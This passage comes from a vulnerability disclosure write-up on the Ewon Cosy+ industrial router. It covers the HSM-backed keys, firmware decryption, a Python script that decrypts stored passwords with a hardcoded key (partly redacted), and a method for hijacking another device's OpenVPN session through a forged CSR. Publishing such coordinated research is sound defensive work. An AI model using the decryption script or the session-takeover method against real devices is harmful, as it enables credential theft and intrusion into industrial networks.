    04:00:b6:0c:57:a0:8e:34:e7:24:2d:0c:8b:41:d2:
    51:ab:bf:76:69:a1:1c:fc:f1:36:a4:57:91:8f:c1:
    5b:f0:58:65:9a:ef:8f:9d:09:23:6b:4a:63:b0:ce:
    4b:57:c8:68:31:9a:87:29:e0:e9:f8:7c:87:69:2f:
    6e:a5:37:b1:ee:bf:db:01:53:c8:c6:5e:77:a9:1b:
    d0:74:71:8c:4f:0f:f1:1b:10:b2:4d:06:d8:e6:25:
    87:0e:51:80:38:bc:70:5e:85:b7:e7:a8:ef:ef:5d:
    4a:ee:80:6b:3a:5b:c0:89:69:fe:5d:ef:ca:c7:c2:
    01:c1:fa:33:24:16:c4:17:09:91:23:7c:bc
ASN1 OID: secp521r1
NIST CURVE: P-521
writing EC key
-----BEGIN EC PRIVATE KEY-----
MIHcAgEBBEIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAA7wAAsKWmtbalprW2EACgBwYFK4EEACOhgYkDgYYABAC2DFeg
jjTnJC0Mi0HSUau/dmmhHPzxNqRXkY/BW/BYZZrvj50JI2tKY7DOS1fIaDGahyng
6fh8h2kvbqU3se6/2wFTyMZed6kb0HRxjE8P8RsQsk0G2OYlhw5RgDi8cF6Ft+eo
7+9dSu6AazpbwIlp/l3vysfCAcH6MyQWxBcJkSN8vA==
-----END EC PRIVATE KEY-----
</pre></td></tr></tbody></table></code></div></div>

<p>This in turn results in cryptographic errors, e.g. when using it directly via OpenSSL or tools like cURL.</p>

<p>According to the HSM documentation, this is not the actual ECC private key. Instead, it is a so-called <em>reference key</em> which only contains the key ID and EC parameter.
In our case, the key ID is <code class="language-plaintext highlighter-rouge">0xEF0000B0</code>.</p>

<p>This reference key is required by OpenSSL, since it can only be used in combination with a syntactically correct key.
With a separate OpenSSL engine, which is defined in the OpenSSL configuration, all cryptographic operations concerning the key are then passed to the HSM.</p>

<p>For example, the following OpenSSL configuration can be used, and the corresponding environment variables can be exported to communicate with the Talk2m API:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>[nxp_engine]
engines = engine_section

[ engine_section ]
e4sss_se050 = e4sss_se050_section

[ e4sss_se050_section ]
dynamic_path = /usr/lib/libsss_engine.so
engine_id = e4sss
init = 1

default_algorithms = EC
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre>$ export OPENSSL_CONF=/etc/ssl/se050_openssl.cnf
$ export EX_SSS_BOOT_SSS_PORT=/dev/i2c-0
$ curl -k -H $'Ewon-Serial: XXXX-XXXX-XX' -H $'Fwr-Version: 21.2s7' -H $'Device-State: New' https://device.talk2m.com/rest/endpoints --key /tmp/birth_key_ref.pem --cert /tmp/birth_key_crt.pem

App   :INFO :Using PortName='/dev/i2c-0' (ENV: EX_SSS_BOOT_SSS_PORT=/dev/i2c-0)
sss   :INFO :atr (Len=35)
      00 A0 00 00    03 96 04 03    E8 00 FE 02    0B 03 E8 08
      01 00 00 00    00 64 00 00    0A 4A 43 4F    50 34 20 41
      54 50 4F
ssse-flw: No matching key in Secure Element. Invoking OpenSSL API: ECDSA_do_sign_ex.
ssse-flw: EmbSe_Simple_Compute_Key invoked (ecdh)
ssse-dbg: ** nid = 415 **
ssse-flw: No matching key in SE. Invoking OpenSSL API: ECDH_compute_key.
ssse-flw: ECDH_compute_key by OpenSSL PASS
ssse-flw: se050_init(): Exit
ssse-dbg: shaAlgo: 773
ssse-flw: SSS based sign (keyId=0xEF0000B0, dgstLen=64)
ssse-flw: SSS based sign called successfully (sigDERLen=138)
ssse-flw: EmbSe_ECDSA_Do_Sign success.
&lt; HTTP/1.1 200
&lt; date: Wed, 17 Apr 2024 11:26:54 GMT
&lt; server: Apache
&lt; device-state: AccountLinked
&lt; x-content-type-options: nosniff
&lt; x-xss-protection: 0
&lt; cache-control: no-cache, no-store, max-age=0, must-revalidate
&lt; pragma: no-cache
&lt; expires: 0
&lt; x-frame-options: DENY
&lt; content-type: application/json
&lt; set-cookie: JSESSIONID=316B8749D308A3CC4B050400072D4AD4; Path=/; HttpOnly
&lt; transfer-encoding: chunked
&lt;
* Connection #0 to host device.talk2m.com left intact
{"endpoints":[{"domain":"eu.device.talk2m.com","ip":"92.52.111.215"}]}
</pre></td></tr></tbody></table></code></div></div>

<p>This complicated the analysis process, since we cannot export the actual private key and use it, for example with a TLS interception proxy.</p>

<p>In order to still find out which API endpoints are being addressed and how the corresponding requests look like, 
we added our own X.509 certificate to the trust store <code class="language-plaintext highlighter-rouge">/usr/root/ewon/bin/deviceapi_castore.crt</code> which is hardcoded in the binary <code class="language-plaintext highlighter-rouge">/usr/bin/ewon</code>. 
Afterwards, the HTTPS communication was redirected to our own HTTPS server, and we were able to see the requests initiated by the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a>.</p>

<p>The following communication endpoints were observed:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>https://device.talk2m.com/certificates
https://device.talk2m.com/certificates/csr
https://device.talk2m.com/certificates/csrOptions
https://device.talk2m.com/certificates/deviceCertificate
https://device.talk2m.com/information
https://device.talk2m.com/registration
https://device.talk2m.com/registration/accountCredentials
https://device.talk2m.com/rest
https://device.talk2m.com/rest/endpoints
https://device.talk2m.com/tunnels
https://device.talk2m.com/tunnels/endpoints
</pre></td></tr></tbody></table></code></div></div>

<p>Finally, we were able to intercept the HTTPS communication and to communicate with the Talk2m platform from the device itself.
<strong>Note:</strong> The security analysis was limited to the device itself. Tests against the services hosted by the manufacturer were not carried out or only in consultation with HMS.</p>

<h1 id="firmware-encryption">Firmware Encryption</h1>

<p>Firmware update packages can be downloaded from the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet?tab=tab-support">manufacturer’s support website</a>.
As assumed, however, the firmware is encrypted, except a header part. This is illustrated by the following output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre></td><td class="rouge-code"><pre>$ xxd -l 912 er14_8s0p22_ma.edf
00000000: 6557 4f4e 2044 2e46 2e20 312e 370d 0a44  eWON D.F. 1.7..D
00000010: 6174 653a 3131 2f31 322f 3230 3233 0d0a  ate:11/12/2023..
00000020: 5043 3a32 320d 0a52 6576 3a31 342e 3820  PC:22..Rev:14.8
00000030: 4557 5f31 345f 3873 300d 0a46 4d3a 3030  EW_14_8s0..FM:00
00000040: 3030 3030 3030 0d0a 4641 3a46 4646 4646  000000..FA:FFFFF
00000050: 4646 460d 0a00 0000 82ad a6fa d37f 0000  FFF.............
00000060: 0000 0000 0000 0000 3040 c7fa d37f 0000  ........0@......
00000070: 0100 0000 ff7f 0000 0000 0000 0000 0000  ................
00000080: 0001 0007 008d 3008 000e 0008 0000 0016  ......0.........
00000090: 0000 0000 ffff ffff 4557 5f31 345f 3873  ........EW_14_8s
000000a0: 3000 0000 0000 0000 3efe 0f5b 0000 0140  0.......&gt;..[...@
000000b0: 7f79 d048 0000 0000 0000 0000 0000 0000  .y.H............
000000c0: 0000 0000 0000 0000 0101 0100 0100 0000  ................
000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000100: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000110: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000120: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000130: 0000 0000 d82d 1a7c c5c7 bb7b 0100 0000  .....-.|...{....
00000140: 1c9e 32ce 34c5 664d 992d 6e45 8168 d6b7  ..2.4.fM.-nE.h..
00000150: 80c7 9df4 346e e56b 77a2 6ac4 fa2b 9005  ....4n.kw.j..+..
00000160: 81ea c9f4 66a4 0fd3 6b08 e4a7 97fd 83a1  ....f...k.......
00000170: 52bd 0b66 2aa7 fbbb 9e06 b794 da1c a328  R..f*..........(
00000180: 0159 3e98 5854 db8c e740 2bf8 b794 f9c6  .Y&gt;.XT...@+.....
00000190: 2472 31d2 1815 9b51 d7b4 98af 4427 c297  $r1....Q....D'..
000001a0: f9fe 3613 3b6f 9f54 e0bf 439c ce57 2b30  ..6.;o.T..C..W+0
000001b0: c4ab bdc4 32ba 934e b231 f678 b859 1061  ....2..N.1.x.Y.a
000001c0: dee4 75d5 09a3 52e2 6c08 d87d 3f99 dc2c  ..u...R.l..}?..,
000001d0: d88a 2aae d37b 9e4f 2d1d 2524 cd26 8919  ..*..{.O-.%$.&amp;..
000001e0: b20c 9704 2933 38aa f0c0 7430 b359 4447  ....)38...t0.YDG
000001f0: 5081 03ed 2952 619f 093d d397 9c53 3d67  P...)Ra..=...S=g
00000200: d2f1 1f34 9ab7 1852 1f89 9d47 42c0 602f  ...4...R...GB.`/
00000210: 7ca0 84f3 b03d 39c5 108b 9d9c 5262 9fea  |....=9.....Rb..
00000220: 5334 259b 8d51 ba8b 76f2 db04 260f 4a5f  S4%..Q..v...&amp;.J_
00000230: b9b2 0884 2b23 ac93 e097 1ddd 9447 f724  ....+#.......G.$
00000240: 3860 3589 8b82 6b84 c725 51a1 a7d0 f51d  8`5...k..%Q.....
00000250: 7428 a6ce 8cc3 8ed7 c5dd a878 89d6 add3  t(.........x....
00000260: 96d5 3296 d41e 2c12 0e21 0d8f e461 7dc2  ..2...,..!...a}.
00000270: 42f4 5297 1c37 8c6b 71fe 738b 8853 222b  B.R..7.kq.s..S"+
00000280: 06ef b9ec d177 e907 604f f0ac fb08 6c46  .....w..`O....lF
00000290: 5c15 7257 4a44 4502 8ed0 8938 ebf6 9beb  \.rWJDE....8....
000002a0: 248b 2c57 085e 25da 3919 6a13 2ab8 4b3f  $.,W.^%.9.j.*.K?
000002b0: 195d c5af 6086 400f d56c 252b 8f21 6a38  .]..`.@..l%+.!j8
000002c0: e7e6 e797 fd83 07db 048a 3946 01ae 4fb1  ..........9F..O.
000002d0: 6db2 f28b 168c 4001 d249 7016 6b78 4733  m.....@..Ip.kxG3
000002e0: d509 4616 51ba 2bdc 5721 dbbc 1190 a408  ..F.Q.+.W!......
000002f0: 576e 1174 20eb 3d24 176c 8ba1 8ab7 ebc1  Wn.t .=$.l......
00000300: 85cd 64a0 7c4a 5844 9442 efe3 ccc3 d884  ..d.|JXD.B......
00000310: 97a0 d47f 8958 c8c1 84ab aa17 bdac 5ffb  .....X........_.
00000320: 1be5 2a40 154b aea7 f2f5 d64e bb80 d782  ..*@.K.....N....
00000330: 4f63 d829 e19b 6877 4f10 db83 c170 a552  Oc.)..hwO....p.R
00000340: 5476 6e8d 8c2a adef 7eb9 b171 c733 48ce  Tvn..*..~..q.3H.
00000350: 73a5 ab2f 8ee8 c5a1 72b0 fb26 3d27 989e  s../....r..&amp;='..
00000360: 33de fe03 ac50 50ca c759 8620 c2fb afeb  3....PP..Y. ....
00000370: 034d fe04 2bf5 2b00 5c25 0c1f 0b59 d7bd  .M..+.+.\%...Y..
00000380: 3f2d 2ac5 8a38 7f27 24f9 be6e b5e3 b07b  ?-*..8.'$..n...{
</pre></td></tr></tbody></table></code></div></div>

<p>While analyzing the update process on the device, we were able to determine the firmware structure and the parsing and decryption process which was as follows:</p>

<ol>
  <li>The script <code class="language-plaintext highlighter-rouge">ewon_update</code> reads a key ID at offset <code class="language-plaintext highlighter-rouge">0x64</code> of the firmware.</li>
  <li>A 256-bit-encrypted AES key is read from offset <code class="language-plaintext highlighter-rouge">0x68</code>.</li>
  <li>An IV is read from offset <code class="language-plaintext highlighter-rouge">0x88</code>.</li>
  <li>The binary <code class="language-plaintext highlighter-rouge">/usr/bin/se050_tool</code> is used to decrypt the encrypted AES key:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">se050_tool</code> passes the encrypted AES key to the HSM.</li>
      <li>The HSM decrypts the AES key and returns it.</li>
      <li>The decrypted 256-bit AES key is written to a file.</li>
    </ul>
  </li>
  <li>An offset of an encrypted firmware parser script is determined by <code class="language-plaintext highlighter-rouge">ewon_update</code>.</li>
  <li>The encrypted script is decrypted using the decrypted AES key and IV using AES in CBC mode and written to a file.</li>
  <li>The parser script reads the firmware structure and decrypts the different file systems and partitions using the decrypted AES key and IV.</li>
  <li>The decrypted file systems and partitions are used to proceed with the update process.</li>
</ol>

<p>The following image illustrates the firmware encryption:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/firmware-encryption.png" alt="Firmware encryption overview" />
<em>Firmware encryption overview</em></p>

<p>As a result, the encrypted key of a firmware update file can only be decrypted with root access to a <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a>.
Nevertheless, this does not prevent leaking firmware-specific encryption keys.</p>

<p>For example, we decrypted the AES key by passing it to the HSM of our rooted device and finally used it to decrypt the corresponding firmware update file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre># Decrypted AES key:
$ xxd decrypted-key
00000000: 6020 b954 6010 d2f9 5fb9 3abd 4960 39d6  ` .T`..._.:.I`9.
00000010: #### #### #### #### #### #### #### ####  ################

# MD5 sum of a decrypted filesystem found in the firmware:
$ md5sum dm-3
0d5d5fb2e3564e70aa3c556d7758e2fc  dm-3

# Decrypted EXT4 file system:
$ file dm-3
dm-3: Linux rev 1.0 ext4 filesystem data, UUID=0ad86007-e34b-4d08-8c1a-e1907661cbe5, volume name "otaroot" (extents) (64bit) (large files) (huge files)
</pre></td></tr></tbody></table></code></div></div>

<p>In addition to the firmware encryption, update files are signed and also verified by the HSM, 
which prevents updating the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> using manipulated firmware files.</p>

<h1 id="password-encryption">Password Encryption</h1>

<p>The Cosy+ stores secrets such as passwords in configuration and backup files in an encrypted format.</p>

<p>The following output shows a sample configuration containing an encrypted password:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>EthIP:10.0.0.53
EthMask:255.255.255.0
EthGW:192.168.33.1
[...]
DefAdmPass:#_5_iuWbFOM6NtpH4i5XOOJW+BJA
[...]
LANDHCPSLeaseTime:3600
IcxModemConnectivityType:0
ModemWanAdapterMTU:0
LANDHCPSFilter:0
</pre></td></tr></tbody></table></code></div></div>

<p>It clearly looks like the first four characters <code class="language-plaintext highlighter-rouge">#_5_</code> are something like a prefix and then followed by a Base64-encoded string.
When decoding the string, it becomes clear that this must be an encryption or some kind of obfuscation:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>$ echo -n "iuWbFOM6NtpH4i5XOOJW+BJA" | base64 -d | xxd
00000000: 8ae5 9b14 e33a 36da 47e2 2e57 38e2 56f8  .....:6.G..W8.V.
00000010: 1240                                     .@
</pre></td></tr></tbody></table></code></div></div>

<p>In previous versions of Ewon products, a simple <a href="https://www.pentestpartners.com/security-blog/ewon-flexy-iot-router-a-deep-dive/#decrypt">XOR encryption</a> was used.
However, this does not apply to newer versions and to our passwords.</p>

<p>Therefore, we first grepped for the usage of the prefix <code class="language-plaintext highlighter-rouge">#_5_</code> in the firmware and found it in the ARM executable <code class="language-plaintext highlighter-rouge">/usr/bin/ewon</code>.</p>

<p>Analyzing the binary with <a href="https://ghidra-sre.org/">Ghidra</a> and reconstructing both the encryption algorithm and the utilized keys was relatively straightforward due to the usage of well-known OpenSSL functions.
Consequently, we were able to simply trace back the usage of the prefix and identify the functions responsible for the encryption process.</p>

<p>The following functions show the password encryption within the binary, whereas the AES key and IV is read from the <code class="language-plaintext highlighter-rouge">.rodata</code> section of the binary.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/ghidra-password.png" alt="Password encryption functions (note: function, variable and pointer names were changed)" />
<em>Password encryption functions (note: function, variable and pointer names were changed)</em></p>

<p>Finally, passwords can be decrypted using the following Python script including the key and IV from offset <code class="language-plaintext highlighter-rouge">0x2ce810</code> and <code class="language-plaintext highlighter-rouge">0x2ce800</code> found in the binary:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">base64</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="n">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>


<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
    <span class="n">padding_length</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span> <span class="o">-</span> <span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="o">%</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">)</span>
    <span class="n">padded_text</span> <span class="o">=</span> <span class="n">text</span> <span class="o">+</span> <span class="nf">bytes</span><span class="p">([</span><span class="n">padding_length</span><span class="p">]</span> <span class="o">*</span> <span class="n">padding_length</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">padded_text</span><span class="p">,</span> <span class="n">padding_length</span>


<span class="n">encoded_text</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">key_hex</span> <span class="o">=</span> <span class="sh">"</span><span class="s">6367[...]</span><span class="sh">"</span>
<span class="n">iv_hex</span> <span class="o">=</span>  <span class="sh">"</span><span class="s">28c9[...]</span><span class="sh">"</span>

<span class="n">key</span> <span class="o">=</span> <span class="nf">unhexlify</span><span class="p">(</span><span class="n">key_hex</span><span class="p">)</span>
<span class="n">iv</span> <span class="o">=</span> <span class="nf">unhexlify</span><span class="p">(</span><span class="n">iv_hex</span><span class="p">)</span>

<span class="n">decoded_text</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">encoded_text</span><span class="p">[</span><span class="mi">4</span><span class="p">:])</span>
<span class="n">padded_text</span><span class="p">,</span> <span class="n">padding_length</span> <span class="o">=</span> <span class="nf">pad</span><span class="p">(</span><span class="n">decoded_text</span><span class="p">)</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="n">decrypted_text</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">padded_text</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Plaintext: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span>
    <span class="n">decrypted_text</span><span class="p">[</span><span class="mi">1</span><span class="p">:][:</span><span class="o">-</span><span class="n">padding_length</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
    <span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<p>A successful decryption of the sample password is shown in the following output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>$ python3 decrypt_ewon_pwd.py "#_5_iuWbFOM6NtpH4i5XOOJW+BJA"
Plaintext: Password123#
</pre></td></tr></tbody></table></code></div></div>

<p>Surprisingly, the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> employs a hardcoded key stored within the binary for password encryption, rather than utilizing the HSM, like it is done for firmware encryption.
This in turn allows decrypting secrets without access to a rooted device.</p>

<h1 id="openvpn-x509-device-certificate">OpenVPN X.509 Device Certificate</h1>

<p>If a <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> device is assigned to a Talk2m account, the device generates a certificate signing request (CSR) containing its serial number as common name (CN) and sends it to the Talk2m API:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/certificates/csr</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">eu.device.talk2m.com</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Ewon-Serial</span><span class="p">:</span> <span class="s">XXXX-XXXX-XX</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en</span>
<span class="na">Fwr-Version</span><span class="p">:</span> <span class="s">21.2s7</span>
<span class="na">Device-State</span><span class="p">:</span> <span class="s">AccountLinked</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">776</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>

<span class="p">{</span><span class="w">
    </span><span class="nl">"csr"</span><span class="p">:</span><span class="w">  </span><span class="s2">"-----BEGIN NEW CERTIFICATE REQUEST-----</span><span class="se">\n</span><span class="s2">MIIB6zCC[...]
kWInsCPhDoKd1f</span><span class="se">\n</span><span class="s2">-----END NEW CERTIFICATE REQUEST-----</span><span class="se">\n</span><span class="s2">"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Afterwards, the signed certificate can be accessed via the Talk2m API by the device:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>$ curl -k -H $'Ewon-Serial: XXXX-XXXX-XX' \
-H $'Fwr-Version: 21.2s7' -H $'Device-State: AccountLinked' \
https://device.talk2m.com/certificates/deviceCertificate \
--key /tmp/birth_key_ref.pem --cert /tmp/birth_key_crt.pem


HTTP/1.1 200
date: Wed, 17 Apr 2024 11:46:53 GMT
server: Apache
ewon-server-time: 1713354414
device-state: VpnProvisioned
connection: close

{"certificate":"-----BEGIN CERTIFICATE-----\nMIIDTjCC[...]
sxyR8w==\n-----END CERTIFICATE-----"}
</pre></td></tr></tbody></table></code></div></div>

<p>This certificate is then used for OpenVPN authentication, as shown in the resulting OpenVPN configuration found on the device:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td><td class="rouge-code"><pre>suppress-timestamps
remote-cert-tls server
reneg-sec 86400
client
tls-exit
rport 443
verb 1
mute 30
script-security 2
comp-lzo
persist-key
up-delay
route-delay 0
dev tap0
lladdr 00:03:27:d8:68:84
greip_lanitf lanbr0
greip_local 3.14.15.92
gremac_local 00:03:27:d8:68:85
gre_lanmac 00:03:27:58:68:85
gre_lanip 10.0.0.53
proto tcp
nobind
keepalive 30 120
hand-window 140
remote 51.195.79.69
resolv-retry 60
tls-version-min 1.2
tls-cipher TLSv1.2:!AES128:!ARIA128:!CAMELLIA128:!MD5:!eNULL:!PSK3
cipher AES-256-GCM
remap-usr1 SIGTERM

&lt;ca&gt;
-----BEGIN CERTIFICATE-----
[...]
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
[...]
-----END CERTIFICATE-----
&lt;/ca&gt;

&lt;cert&gt;
-----BEGIN CERTIFICATE-----
MIIDTjCC
[...]
sxyR8w==
-----END CERTIFICATE-----
&lt;/cert&gt;

&lt;key&gt;
-----BEGIN PRIVATE KEY-----
[...]
-----END PRIVATE KEY-----
&lt;/key&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>However, there is no other indicator than the device’s serial number in the common name of the certificate to differentiate the VPN session in order to assign the session to the corresponding Talk2m account.
Therefore, we tried to enroll our own CSR with a CN (serial number) of another (foreign) device to check for potential security issues.</p>

<p>Afterwards, our CSR containing a foreign serial number was signed by the manufacturer certificate authority (CA) <code class="language-plaintext highlighter-rouge">Talk2M VPN Device CA_202306121033</code>:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/cert.png" alt="Correctly signed X.509 certificate containing a foreign device serial number" width="80%" />
<em>Correctly signed X.509 certificate containing a foreign device serial number</em></p>

<p><strong>Note:</strong> The shown serial number <code class="language-plaintext highlighter-rouge">D2307-0101-25</code> was provided by HMS to verify and prove the security vulnerability.</p>

<p>By using this certificate and the corresponding key for OpenVPN authentication, we were able to successfully initiate a VPN session, as the following figure illustrates:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/vpn.png" alt="OpenVPN session using a foreign Cosy+ certificate" />
<em>OpenVPN session using a foreign Cosy+ certificate</em></p>

<p>Finally, our connection overwrote the original one with the given device’s serial number, and we successfully took over the OpenVPN session.</p>

<p>This circumstance results in several security risks:</p>

<ul>
  <li>The original VPN session will be overwritten, and thus the original device is not accessible anymore.</li>
  <li>If Talk2m users connect to the device using the VPN client software <a href="https://www.hms-networks.com/ecatcher">Ecatcher</a>, they will be forwarded to the attacker.
This allows attackers to conduct further attacks against the used client, for example accessing network services such as RDP or SMB of the victim client.
The fact that the tunnel connection itself is not restricted favors this attack.</li>
  <li>Since the network communication is forwarded to the attacker, the original network and systems could be imitated in order to intercept the victim’s user input such as the uploaded PLC programs or similar.</li>
</ul>

<p>An illustration of such an attack is shown below:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/hijack.png" alt="Attack scenario" />
<em>Attack scenario</em></p>

<h1 id="conclusion">Conclusion</h1>

<p>We found multiple security vulnerabilities in the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Ewon Cosy+</a> which allow fully compromising the device.
Furthermore, we were able to analyze and comprehend several cryptographic operations such as firmware and password decryption, or secure communication to the Talk2m platform.
Ultimately, a security vulnerability in the device assignment could be exploited to take over OpenVPN sessions of foreign devices resulting in major security risks.</p>

<p>The following table provides an overview of the found security vulnerabilities.</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Vulnerability Type</th>
      <th>SySS ID</th>
      <th>CVE ID</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Improper Neutralization of Input During Web Page Generation (CWE-79)</td>
      <td><a href="https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-016.txt">SYSS-2024-016</a></td>
      <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-33893">CVE-2024-33893</a></td>
    </tr>
    <tr>
      <td>Cleartext Storage of Sensitive Information in a Cookie (CWE-315)</td>
      <td><a href="https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-017.txt">SYSS-2024-017</a></td>
      <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-33892">CVE-2024-33892</a></td>
    </tr>
    <tr>
      <td>OS Command Injection (CWE-78)</td>
      <td><a href="https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-018.txt">SYSS-2024-018</a></td>
      <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-33896">CVE-2024-33896</a></td>
    </tr>
    <tr>
      <td>Use of Hardcoded Cryptographic Key (CWE-321)</td>
